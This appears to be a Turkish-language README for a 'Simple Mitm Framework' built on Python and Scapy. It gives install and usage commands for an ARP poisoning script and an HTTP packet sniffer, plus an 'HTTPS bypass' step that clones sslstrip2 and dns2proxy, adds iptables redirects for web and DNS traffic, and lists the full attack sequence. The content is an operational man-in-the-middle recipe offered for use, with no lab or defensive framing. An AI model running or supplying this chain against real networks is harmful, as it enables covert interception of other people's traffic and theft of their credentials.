# Simple Mitm Framework

Python3 ile Scapy Kullanarak Yapılmış **Man-In-The-Middle** Yazılımı

## Gerekli Paketlerin kurulması :
```
- pip3 install scapy
- pip3 install scapy_http

OR ( Ya da )

- pip3 install -r requirements.txt
```
## IP Forward 

```
- echo 1 > /proc/sys/net/ipv4/ip_forward
```



# Arp_Poison.py

>- ARP Paketleri Yollayarak **ARP Zehirlemesi** Gerçekleştirir.

## Kullanım :

```
- python3 arp_poison.py -t x.x.x.x -g x.x.x.x
```


# Listener.py

> - ARP Zehirlenmesinden Sonra Tüm **HTTP** paketlerini Yakalar ve Ekrana Yazdırır.

## Kullanım : 
```
- python3 listener.py -i wlan0
```

**Listener.py** yerine Herhangi Bir Ağ Dineleme Yazılımı Kullanabilirsiniz. Örn: **Wireshark**

# HTTPS Atlatmak : 

## Gerekli Uygulamaların İndirilmesi : 

```
git clone https://github.com/byt3bl33d3r/sslstrip2
git clone https://github.com/singe/dns2proxy
```

## IP Table Konfigürasyonu:

**SSLStrip için :**

```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```
**DNS2Proxy için:**
```
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
```

## Kullanım : 
```
- echo 1 > /proc/sys/net/ipv4/ip_forward

- python3 arp_poison.py -t x.x.x.x -g x.x.x.x

- python3 sslstrip.py

- python3 dns2proxy.py

- python3 listener.py -i wlan0
